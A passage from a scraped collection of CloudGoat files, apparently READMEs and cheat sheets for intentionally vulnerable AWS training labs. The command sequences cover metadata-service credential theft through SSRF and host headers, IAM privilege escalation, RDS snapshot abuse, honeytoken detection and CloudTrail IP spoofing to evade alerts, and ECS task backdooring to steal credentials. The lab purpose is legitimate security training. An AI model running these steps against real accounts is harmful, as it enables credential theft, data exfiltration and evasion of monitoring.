users.\n\n### Privilege Escalation with CreateAccessKey\n\nRun the privilege escalation scan in Pacu to identify exploitable methods:\n\n```bash\nPacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --scan-only\n```\n\nNotice that the `CreateAccessKey` method is confirmed as a viable escalation vector. Now execute the method to target the administrator user:\n\n```bash\nPacu (beanstalk2:imported-beanstalk2) > run iam__privesc_scan --user-methods CreateAccessKey\n```\n\nFollow the prompts to select the admin user. Pacu will then generate a new access key for the admin user and display the credentials.\n\n### Configuring the Admin Profile\n\nUsing the new admin credentials, set up an AWS CLI profile:\n\n```bash\naws configure --profile admin\n```\n\nEnter the provided admin Access Key ID and Secret Access Key. Confirm access:\n\n```bash\naws sts get-caller-identity --profile admin\n```\n\n### Retrieving the Final Flag\n\nFinally, with admin privileges, run the secrets enumeration module to retrieve the final flag:\n\n```bash\nPacu (beanstalk3:imported-admin) > run secrets__enum --region us-east-1\n```\n\nCheck the downloaded secrets in the Pacu output directory (typically under `~/.local/share/pacu/<session>/downloads/secrets/`). For example:\n\n```bash\ncat ~/.local/share/pacu/beanstalk3/downloads/secrets/secrets_manager/secrets.txt\n```\n\nThe file should contain the final flag, for example:  \n`FLAG{*********************}`\n", "timestamp": "2025-10-24T11:39:35.085111"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/cloud_breach_s3/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/cloud_breach_s3/README.md", "content": "# Scenario: cloud_breach_s3\n\n**Size:** Small\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create cloud_breach_s3`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * EC2 x 1\n  * S3 x 1\n\n## Scenario Start(s)\n\n1. The IP Address of an EC2 server that is running a misconfigured reverse proxy\n\n## Scenario Goal(s)\n\nDownload the confidential files from the S3 bucket.\n\n## Summary\n\nStarting as an anonymous outsider with no access or privileges, exploit a misconfigured reverse-proxy server to query the EC2 metadata service and acquire instance profile keys. Then, use those keys to discover, access, and exfiltrate sensitive data from an S3 bucket.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3ffe907e-6281-47e9-b7bf-e07fdcb48103/image.png)\n\n## Route Walkthrough - Anonymous Attacker\n\n1. The attacker finds the IP of an EC2 instance by shady means, and after some reconnaissance realizes that it is acting as a reverse-proxy server. This is common, especially for organizations in the process of moving from on-premise to the cloud.\n2. After some research, the attacker uses `CURL` to send a request to the web server and set the host header to the IP address of EC2 metadata service.\n3. The attacker's specially-crafted CURL command is successful, returning the Access Key ID, Secret Access Key, and Session Token of the IAM Instance Profile attached to the EC2 instance.\n4. With the IAM role's credentials in hand, the attacker is now able to explore the victim's cloud environment using the powerful permissions granted to the role.\n5. The attacker is then able to list, identify, and access a private S3 bucket.\n6. Inside the private S3 bucket, the attacker finds several files full of sensitive information, and is able to download these to their local machine for dissemination.\n\nA cheat sheet for this route is available [here](./cheat_sheet.md).\n", "timestamp": "2025-10-24T11:39:35.712203"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/cloud_breach_s3/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/cloud_breach_s3/cheat_sheet.md", "content": "`curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'`\n\n‚Äã\n`curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'`\n\n‚Äã\n`aws configure --profile erratic`\n\n‚Äã\n`aws_session_token = <session-token>`\n\n‚Äã\n`aws s3 ls --profile erratic`\n\n‚Äã\n`aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic`\n", "timestamp": "2025-10-24T11:39:36.107269"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/codebuild_secrets/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/codebuild_secrets/README.md", "content": "# Scenario: codebuild_secrets\n\n**Size:** Large\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create codebuild_secrets`\n\n## Scenario Resources\n\n- 1 CodeBuild Project\n- 1 Lambda function\n- 1 VPC with:\n  - RDS x 1\n  - EC2 x 1\n- 2 IAM Users\n- 2 SSM Parameters\n\n## Scenario Start(s)\n\nIAM User \"Solo\".\n\n## Scenario Goal(s)\n\nA pair of secret strings stored in a secure RDS database.\n\n## Summary\n\nStarting as the IAM user Solo, the attacker first enumerates and explores CodeBuild projects, finding unsecured IAM keys for the IAM user Calrissian therein. Then operating as Calrissian, the attacker discovers an RDS database. Unable to access the database's contents directly, the attacker can make clever use of the RDS snapshot functionality to acquire the scenario's goal: a pair of secret strings.\n\nAlternatively, the attacker may explore SSM parameters and find SSH keys to an EC2 instance. Using the metadata service, the attacker can acquire the EC2 instance-profile's keys and push deeper into the target environment, eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.\n\nNote: This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3580abff-ea55-4719-a368-8618f8b61370/image.png)\n\n## Walkthrough - Calrissian via RDS Snapshot\n\n1. As the IAM User Solo, the attacker explores the AWS environment and discovers they are able to list CodeBuild projects.\n2. Within the CodeBuild project, the attacker discovers IAM keys for the user \"Calrissian\" stored in environment variables.\n3. Assuming the identity of the Calrissian user, the attacker is able to list RDS instances and discover the private database which contains the scenario's goal.\n4. While unable to directly access the RDS instance, the attacker is able to create a snapshot from it.\n5. The attacker is then able to create a new RDS instance from the snapshot.\n6. By resetting the admin password of the newly created RDS instance, the attacker is able to grant themselves access to its contents.\n7. After logging into the restored RDS database, the attacker is able to acquire the scenario's goal: the secret strings!\n\nA cheat sheet for this route is available [here](./cheat_sheet_calrissian.md).\n\n## Walkthrough - Solo via EC2 Metadata service\n\n1. As the IAM User Solo, the attacker explores the AWS environment and discovers they are able to list SSM parameters.\n2. Among the account's SSM parameters, the attacker finds a pair of SSH keys stored without any encryption.\n3. The attacker then lists EC2 instances, looking for somewhere to try the SSH keys they found.\n4. After discovering an EC2 instance in the account, the attacker successfully connects to the EC2 instance.\n\n**Branch A**\n\n1. Now working with shell access, the attacker queries the EC2 metadata service and discovers the instance-profile's IAM keys.\n2. Using the EC2 instance's profile, the attacker is able enumerate Lambda functions.\n3. The attacker discovers admin credentials for the RDS database stored insecurely in Lambda environment variables.\n4. Still using the EC2 instance's profile, the attacker lists and accesses the RDS database, and is able to log in using the admin credentials they discovered.\n5. With full access to the RDS database, the attacker is able to recover the scenario's goal: A pair of secret strings!\n\n**Branch B**\n\n1. Now working with shell access, the attacker queries the EC2 metadata service and discovers that the database address is stored there, along with admin credentials.\n2. Using the RDS credentials and address recovered from the EC2 metadata service, the attacker is able to directly log in to the RDS database.\n3. With full access to the RDS database, the attacker is able to recover the scenario's goal: A pair of secret strings!\n\nA cheat sheet for this route is available [here](./cheat_sheet_solo.md).\n", "timestamp": "2025-10-24T11:39:36.777985"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_calrissian.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_calrissian.md", "content": "`aws configure --profile Solo`\n\n`aws codebuild list-projects --profile Solo`\n\n`aws codebuild batch-get-projects --names <project> --profile Solo`\n\n`aws configure --profile Calrissian`\n\n`aws rds describe-db-instances --profile Calrissian`\n\n`aws rds create-db-snapshot --db-instance-identifier <instanceID> --db-snapshot-identifier cloudgoat --profile Calrissian`\n\n`aws rds describe-db-subnet-groups --profile Calrissian`\n\n`aws ec2 describe-security-groups --profile Calrissian`\n\n`aws rds restore-db-instance-from-db-snapshot --db-instance-identifier <DbInstanceID> --db-snapshot-identifier <scapshotId> --db-subnet-group-name <db subnet group> --publicly-accessible --vpc-security-group-ids <ec2-security group> --profile Calrissian`\n\n`aws rds modify-db-instance --db-instance-identifier <DbName> --master-user-password cloudgoat --profile Calrissian`\n\n`psql postgresql://cgadmin@pwnedfinal.crkxmju52zsx.us-east-1.rds.amazonaws.com:5432/postgres`\n\n`\\l`\n\n`\\c securedb`\n\n`select * from sensitive_information`\n", "timestamp": "2025-10-24T11:39:37.193472"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_solo.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/codebuild_secrets/cheat_sheet_solo.md", "content": "`aws ssm describe-parameters --profile solo`\n\n`aws ssm get-parameter --name <private key name> --profile solo`\n\n`echo -e \"<private key>\" > ec2_ssh_key`\n\n`chmod 400 ec2_ssh_key`\n\n`aws ssm get-parameter --name <public key name> --profile solo`\n\n`echo -e \"<public key>\" > ec2_ssh_key.pub`\n\n`aws ec2 describe-instances --profile solo`\n\n`ssh -i ec2_ssh_key ubuntu@<instance ip>`\n\n# BRANCH A:\n\n`sudo apt update && sudo apt install awscli -y`\n\n`aws lambda list-functions --region us-east-1`\n\n`aws rds describe-db-instances --profile solo`\n\n# BRANCH B:\n\n`curl http://169.254.169.254/latest/user-data`\n\n`psql -h <rds db host/ip> -U cgadmin -d cloudgoat`\n\n`\\d`\n\n`select * from sensitive_information;`", "timestamp": "2025-10-24T11:39:37.351973"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/detection_evasion/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/detection_evasion/README.md", "content": "# Scenario: detection_evasion\n\n**Size:**  Medium\n\n**Difficulty:** Hard\n\n**Command:** $ ./cloudgoat.py create detection_evasion\n\n## Scenario Resources (High Level)\n\n- 4 IAM Users\n- 2 EC2 instances\n- 2 SecretsManager secrets\n- A suite of detection mechanisms\n  - CloudTrail\n  - S3\n  - CloudWatch\n  - SNS\n\n## Scenario Start(s)\n\n4 pairs of IAM Credentials.\n\n## Scenario Goal(s)\n\nThe goal of this scenario is to read out the values for both secrets without being detected. The secrets are both stored in Secrets Manager, and their values have the following format (cg-secret-XXXXXX-XXXXXX).\n\n## Summary (TLDR setup below)\n\nThis scenario is significantly different from the CloudGoat scenarios that have come before in how it plays.\nIn detection_evasion, your goals will be outlined for you more clearly, and the challenge is to complete them without triggering alarms. There is more setup involved in this scenario, and it will take longer to play (you might want/need to play it multiple times).\n\nFor starters, you will need to provide an email address to which cloudgoat can send email alerts. When/If you are detected by the automated mechanisms, an alert will be sent to this email address. If you don't want to use your standard email address, you can consider a service such as https://temp-mail.org/ or https://www.fakemail.net/.\n\nAfter deployment is complete, you will need to wait about an hour before playing the scenario. This is, unfortunately, necessary for the cloudwatch alerts to fully integrate with cloudtrails logs. It should also be kept in mind that there can be a significant delay in alerts for actions that you take (10-15 minutes is not uncommon). So check your email\nperiodically to see if you have triggered an alert.\n\n## TLDR Setup\n\n1. Set up a temporary email address if desired.\n2. Deploy the cloudgoat scenario. You will need to enter your email when prompted, and it will subsequently be stored in the 'config.yml' file at the top level of the repo.\n3. Check your email address for SNS confirmation emails; there should be two. Confirm that you want to subscribe to the topics.\n4. Wait 30-60 minutes before working on the scenario. This is necessary because there is some lag between the time that terraform finishes deploying all resources, and the time that your CLI actions will actually trigger the alerts that result in email notifications.\n5. Read the 'start.txt' file that is generated after deployment for some guidance. There will not be major spoilers in this file (as there are in [cheat_sheet.md](cheat_sheet.md))\n\n# **SPOILER ALERT:** There are spoilers for the scenario below this point.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](./detection_evasion_exploitation_route.png)\n\n## Walkthrough Overview - Easy Path\n\n1. Discover that some of the credentials initially given to you are honeytokens, without triggering alerts.\n2. Install the aws cli on the instance.\n3. Read the secret value of the corresponding secret from the ec2 instance to avoid detection.\n\n## Walkthrough Overview - Hard Path\n\n1. Discover that some of the credentials initially given to you are honeytokens, without triggering alerts.\n2. Move onto the ec2 instance, and grab the credentials from IMDS\n3. Spoof the IP of the instance from which you grabbed the credentials, and read the secret value of the corresponding secret.\n", "timestamp": "2025-10-24T11:39:37.991309"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/detection_evasion/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/detection_evasion/cheat_sheet.md", "content": "## Easy Path\n\n1. Iterate through the starting credentials to identify the honeytokens. There are a few ways to do this. Pacu has a\n   module for this process, but we reccomend doing it manually in order to understand the process here.\n\n    ```bash\n    # There are services which do not log to CloudTrail. Honeytokens almost never grant permissions to ANY services, let alone these services which do not log to CloudTrail. Thus ,the call below will fail for a honeytoken, but will reveal the ARN of the principal associated with the credentials. This information is usually sufficient to infer if the principal is only being used for honeytokens.\n    aws --profile cg1 --region us-east-1 sdb list-domains\n    # The above command reveals that user1 is \"user/canarytokens.com@@kz9r8ouqnhve4zs1yi4bzspzz\". These tokens are generated by a third party honeytoken service \"canarytokens.com\" (as you may have guessed). \n   \n    aws --profile cg2 --region us-east-1 sdb list-domains\n    # The above command reveals that user2 is \"user/SpaceCrab/l_salander\". This indicates that the honeytoken was generated by SpaceCrab (a tool which appears to now be outdated).\n   \n    aws --profile cg3 --region us-east-1 sdb list-domains\n    # The above command reveals that user3 is \"user/cd1fceca-e751-4c1b-83e4-78d309063830\". Although not nearly as suspicious as the first two users, this UUID format indicated that the user is being automatically generated. This UUID format is also used by the SpaceSiren honeytoken tool.   \n   \n    aws --profile cg4 --region us-east-1 sdb list-domains\n    # The above command reveals that user4 has permissions to the sdb service, and is therefore likely a legitimate user.\n    ```\n\n2. Now that you have identified which pair of credentials are honeytokens and which are likely legitimate, you can\n   perform some enumeration to determine who you are, what group you are a part of, what permissions are assigned to\n   that group, what EC2 instances exist, and which one to target in the next step.\n\n    ```bash\n    # The command below will reveal the ARN of your current principal. \n    aws --profile cg4 sts get-caller-identity\n   \n    # The command below will list the groups to which your user belongs.\n    aws --profile cg4 iam list-groups-for-user --user-name r_waterhouse\n   \n    # The command below will list the policies attached to your group.\n    aws --profile cg4 iam list-group-policies --group-name cg-developers\n   \n    # The command below will list out the developer policy in detail. You will see a statement focusing on SSM which includes \"ssm:StartSession\". This will be used later to get a shell on an EC2 instance.\n    aws --profile cg4 iam get-group-policy --group-name cg-developers --policy-name developer_policy\n   \n    # The command below will reveal that the AWS managed policy \"ReadOnlyAccess\" is attached to the cg-developers group.\n    aws --profile cg4 iam list-attached-group-policies --group-name cg-developers\n   \n    # The command below will list all EC2 instances, revealing the instance that we will target in this section \"easy_path-cg-detection-evasion\"\n    aws --profile cg4 --region us-east-1 ec2 describe-instances\n    ```\n\n3. Use SSM to get a shell on the \"easy_path\" instance.\n\nFor this to work you'll first need to ensure you have the\n[ssm plugin](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html)\ninstalled. If it is not installed you may receive a permission error about terminating sessions.\n\n    ```bash\n    # The command below will result in a shell on the EC2 instance of your choice. \n    aws --profile cg4 --region us-east-1  ssm start-session --target [INSTANCE_ID]\n    ```\n\n5. Determine if there is a role associated with this EC2 instance.\n\n    ```bash\n    # The command below will reach out to the IMDS endpoint, and will return the name of an instance profile.\n    curl http://169.254.169.254/latest/meta-data/iam/security-credentials\n   \n    # The command below will reach out to the IMDS endpoint, and will return credentials for the role associated with this instance.\n    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[INSTANCE_PROFILE]\n    ```\n\n\n5. Install the AWS CLI, list all secrets, and read the contents of the associated secrets. This step is another\n   opportunity to trigger alerts. If you use the credentials associated with this instance from an unknown IP, an alert\n   will be triggered. This is why we install the CLI on the EC2 instance and take actions from there.\n\n    ```bash\n    # The command below will confirm that the AWS CLI is not installed.\n    aws --version\n   \n    # The command below will install the AWS CLI.\n    sudo yum install awscli -y\n   \n    # The command below will confirm that the AWS CLI is installed.\n    aws --version\n   \n    # The command below will list all secrets in secrets manager. \n    aws --region us-east-1  secretsmanager list-secrets\n   \n    # The command below will read out the value for the secret associated with this path. \n    aws --region us-east-1  secretsmanager get-secret-value --secret-id [SECRET_ARN]\n    ```\n\n## Hard Path\n\nSteps 1-4 are almost identical for the \"hard path\" of this scenario. The only difference is, on step 3, you will target\nthe \"hard_path-cg-detection-evasion\" instance. In this light, we will start the steps for the \"hard path\" on step 5,\nafter you have retrieved the credentials from IMDS.\n\n5. Check if the AWS CLI is installed. Realize you have no internet access. Unlike the \"easy path\", you cannot take\n   actions with the CLI from this instance. Yet, like the \"easy path\", any event logged in CloudTrail, using credentials\n   from this instance and from an IP other than that of this EC2 instance, will trigger alerts.\n\n    ```bash\n    # The command below will confirm that the AWS CLI is installed. However, attempts to use it will fail. This is because the instance has no access to the public internet. \n    aws --version\n   \n    # You can run any aws command from this instance to confirm that it will not work.\n    aws sts get-caller-identity\n    ```\n\n6. There is a way to spoof arbitrary IP addresses in CloudTrail, and you can read about it\n   in [this blog post](https://www.hunters.security/en/blog/hunters-research-detecting-obfuscated-attacker-ip-in-aws). Instead of\n   walking through this entire technique in duplicate here, we have created a public github repo with terraform code\n   that will deploy the necessary resources to perform the bypass.\n\n   Follow the README.md for the solution\n   https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/detection_evasion/solution/README.md\n\n7. Once you have deployed the terraform resources mentioned above, you should have a shell on the ec2 instance that was\n   created. Run the following on that instance.\n\n    ```bash\n    # The command below will list all secrets in secretsmanager.\n    aws --region us-east-1 secretsmanager list-secrets\n   \n    # The command below will\n    aws --region us-east-1 secretsmanager get-secret-value --secret-id [ARN_OF_TARGET_SECRET]\n    ```\n\nAt this point you have finished the scenario. \n", "timestamp": "2025-10-24T11:39:38.239426"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/detection_evasion/solution/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/detection_evasion/solution/README.md", "content": "This terraform code will deploy an EC2 instance in a VPC, with the VPC endpoints that are necessary to complete this scenario. Only a few AWS services are needed to be used at this stage in the scenario, so only the associated endpoints (and those required for SSM to function) are deployed.\n\nIn order to use this terraform code to finish the scenario you need to:\n* Identify the IP of the ec2 instance you want to spoof (CloudTrails does not distinguish between public and private IPs in the \"sourceIPAddress\" field).\n* run `terraform init`\n* run `terraform apply -var profile=\"__aws_profile_name__\" -var target_ip=\"__ec2.instance.ip.addr__\"`\n  * This assumes the instance IP is in the `3.84.104.*` range. If it's not, you'll need to set `-var target_cidr_block=\"__cidr.ip.block__/24\"\n* Ensure the SSM awscli plugin is installed ([SSM plugin install docs](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html)).\n* log into the console and get a shell on the instance with ssm.\n\n    ```bash\n    # The following command will return a shell from the target instance. If you getting a (TargetNotConnected) error and you just deployed the resources, wait 10 min and try again. There can be a lag time before SSM works properly.\n    aws --profile cg4 --region us-east-1 ssm start-session --target [INSTANCE_ID]\n    ```\n", "timestamp": "2025-10-24T11:39:38.648543"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ec2_ssrf/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/README.md", "content": "# Scenario: ec2_ssrf\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create ec2_ssrf`\n\n## Scenario Resources\n\n- 1 VPC with:\n\t- EC2 x 1\n- 1 Lambda Function\n- 1 S3 Bucket\n\n## Scenario Start(s)\n\n1. IAM User \"Solus\"\n\n## Scenario Goal(s)\n\nInvoke the \"cg-lambda-[ CloudGoat ID ]\" Lambda function.\n\n## Summary\n\nStarting as the IAM user Solus, the attacker discovers they have ReadOnly permissions to a Lambda function, where hardcoded secrets lead them to an EC2 instance running a web application that is vulnerable to server-side request forgery (SSRF). After exploiting the vulnerable app and acquiring keys from the EC2 metadata service, the attacker gains access to a private S3 bucket with a set of keys that allow them to invoke the Lambda function and complete the scenario.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/3117f737-3290-48c6-b0bf-e122a305858d/image.png)\n\n## Route Walkthrough - IAM User \"Solus\"\n\n1. As the IAM user Solus, the attacker explores the AWS environment and discovers they can list Lambda functions in the account.\n2. Within a Lambda function, the attacker finds AWS access keys belonging to a different user - the IAM user Wrex.\n3. Now operating as Wrex, the attacker discovers an EC2 instance running a web application vulnerable to a SSRF vulnerability.\n4. Exploiting the SSRF vulnerability via the `?url=...` parameter, the attacker is able to steal AWS keys from the EC2 metadata service.\n5. Now using the keys from the EC2 instance, the attacker finds a private S3 bucket containing another set of AWS credentials for a more powerful user: Shepard.\n6. Now operating as Shepard, with full-admin final privileges, the attacker can invoke the original Lambda function to complete the scenario.\n\nA cheat sheet for this route is available [here](./cheat_sheet_solus.md).", "timestamp": "2025-10-24T11:39:39.267834"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ec2_ssrf/cheat_sheet_solus.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/cheat_sheet_solus.md", "content": "`aws configure --profile solus`\n\n`aws lambda list-functions --profile solus`\n\n`aws configure --profile cglambda`\n\n`aws ec2 describe-instances --profile cglambda`\n\nGo to `http://<EC2 instance IP>`\n\nAbuse the SSRF via the \"url\" parameter to hit the EC2 instance metadata by going to:\n\n`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n\nAnd then:\n\n`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<the role name>`\n\nThen Add the EC2 instance credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:\n\n```\n[ec2role]\naws_access_key_id = asdasdasd\naws_secret_access_key = asdasdsadas\naws_session_token = \"asdasdasd\"\n```\n\n`aws s3 ls --profile cgec2role`\n\n`aws s3 ls --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>`\n\n`aws s3 cp --profile cgec2role s3://cg-secret-s3-bucket-<cloudgoat_id>/aws/credentials ./`\n\n`cat admin-user.txt`\n\n`aws configure --profile cgadmin`\n\n`aws lambda list-functions --profile cgadmin`\n\n`aws lambda invoke --function-name cg-lambda-<cloudgoat_id> ./out.txt --profile cgadmin`\n\n`cat out.txt`", "timestamp": "2025-10-24T11:39:39.924433"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ecs_efs_attack/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ecs_efs_attack/README.md", "content": "# Scenario: ecs_efs_attack\n\n**Size:** Large\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create ecs_efs_attack`\n\n## Scenario Resources\n\n- 1 VPC with:\n\t- EC2 x 2\n\t- 1 ECS Cluster\n\t- 1 ECS Service \n\t- 1 EFS\n\n## Scenario Start(s)\n\n1. SSH access to \"Ruse_Box\" EC2\n\n## Scenario Goal(s)\n\nMount the \"cg-efs-[CG_ID]\" efs and obtain the flag.\n\n## Summary\n\nStarting with accessing the \"ruse\" EC2 the user leverages the instance profile to backdoor the running ECS container. Using the backdoored container the attacker can retrieve credentials from the container metadata API. These credentials allow the attacker to start a session on any EC2 with the proper tags set. The attacker uses their permissions to change the tags on the Admin EC2 and starts a session. Once in the Admin EC2 the attacker will port scan the subnet for an open EFS to mount. Once mounted the attacker can retrieve the flag from the elastic file system.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](assets/diagram.png)\n\n## Route Walkthrough \n\n1. Access the \"Ruse_Box\" ec2 using the provided access key.\n2. From the ec2 enumerate permission. Then list available ec2 and note how the tags are configured.\n3. From the current ec2 enumerate existing ecs cluster and backdoor the existing task definition.\n4. Update the existing service in the ecs cluster to execute the payload.\n5. From the container credentials use the SSM:StartSession privilege to access the admin_box.\n6. Port scan the subnet to find available efs and mount.\n\n**A cheat sheet for this route is available [here](./cheat_sheet.md).**\n", "timestamp": "2025-10-24T11:39:40.663159"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ecs_efs_attack/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ecs_efs_attack/cheat_sheet.md", "content": "1. Connect to the start ec2 \"Ruse_Box\" using the public IP and SSH key provided.\n\n    `ssh -i cloudgoat ubuntu@<IP ADDRESS>`\n\n2. Configure the role credentials \n\n    `aws configure --profile ruse`\n\n3. List the privileges \n`aws iam list-policies --profile ruse`\n\n4. List ec2 instances \n\n    `aws ec2 describe-instances --profile ruse `\n\n5. List all available ECS clusters \n\n    `aws ecs list-clusters --profile ruse`\n\n6. List services in cloudgoat cluster\n\n    `aws ecs list-services --cluster <CLUSTER NAME> --profile ruse`\n\n7. Download task definition \n\n    `aws ecs describe-task-definition --task-definition <TASK_NAME>:<VERSION> --profile ruse > task_def.json `\n\n8. Download template to register a new task\n\n    `aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`\n\n9. Now use task_def.json to fill out template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)\n\n10. Now register the template to replace the currently running task.\n\n    `register-task-definition --cli-input-json file://task_template.json  --profile ruse`\n\n11. Update the ECS service with the newly registered task definition.\n\n    `aws ecs update-service --cluster <CLUSTER NAME> --service <SERVICE NAME> --task-definition <NEW TASK DEFINITION NAME>`\n\n12. Wait for the task to run and POST the credentials to your listener\n\n13. With the new creds add them to \"ruse_box\"\n\n    `aws configure --profile ecs`\n\n14. Modify admin ec2 tags\n\n    `aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true`\n\n15. Using ecs creds start a session on admin ec2 \n\n    `aws ssm start-session --target <INSTANCE ID> --profile ecs`\n\n16. Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.\n\n    `nmap -Pn -P 2049 --open 10.10.10.0/24 `\n\n17. Mount discovered ec2 \n\n    `cd /mnt`\n`sudo mkdir /efs`\n`sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs`\n", "timestamp": "2025-10-24T11:39:41.026444"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ecs_takeover/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ecs_takeover/README.md", "content": "# Scenario: ecs_takeover\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create ecs_takeover`\n\n## Scenario Resources\n\n- 1 VPC and Subnet with:\n    - 2 EC2 Instances\n    - 1 ECS Cluster\n    - 3 ECS Services\n    - 1 Internet Gateway\n\n## Scenario Start(s)\n\n1. Access the external website via the EC2 Instance's public IP.\n\n## Scenario Goal(s)\n\nGain access to the \"vault\" container and retrieve the flag.\n\n## Summary\n\nStarting with access to the external website the attacker needs to find a remote code execution vulnerability. Through\nthis the attacker can take advantage of resources available to the container hosting the website. The attacker discovers\nthat the container has access to the host's metadata service and role credentials. They also discover the Docker socket\nmounted in the container giving full unauthenticated access to Docker on one host in the cluster. Abusing the mount\nmisconfiguration, the attacker can enumerate other running containers on the instance and compromise the container role\nof a semi-privileged privd container. Using the privd role the attacker can enumerate the nodes and running tasks across\nthe ECS cluster where another task \"vault\" is discovered to be running on a second node. With the host container\nprivileges gained earlier, the attacker modifies the state of the cluster and forces ECS to reschedule the container to\nthe compromised host. This allows the attacker to access the flag stored in the root of the \"vault\" container instance\nthrough docker.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](assets/diagram.png)\n\n## Route Walkthrough \n\n1. Access the website using the provided URL.\n2. Exploit code injection vulnerability to execute commands in the website container.\n3. Search for available AWS credentials.\n  a. Obtain the AWS credentials from the container instance's (the host's) metadata service.\n  b. Leverage the docker socket mounted in the website container to retrieve AWS credentials from the \"privd\" container.\n5. Use the \"privd\" container role to find the other worker nodes and the \"vault\" task.\n6. Using IAM privileges of the container instance node, deregister or drain the other worker instance.\n7. Wait for the \"vault\" container to be rescheduled and deployed to the attacker's worker instance.\n\n\n## Additional Information\n\nHttps://ruse.tech/blogs/ecs-attack-methods\n\n**A cheat sheet for this route is available [here](./cheat_sheet.md).**\n", "timestamp": "2025-10-24T11:39:41.640447"}
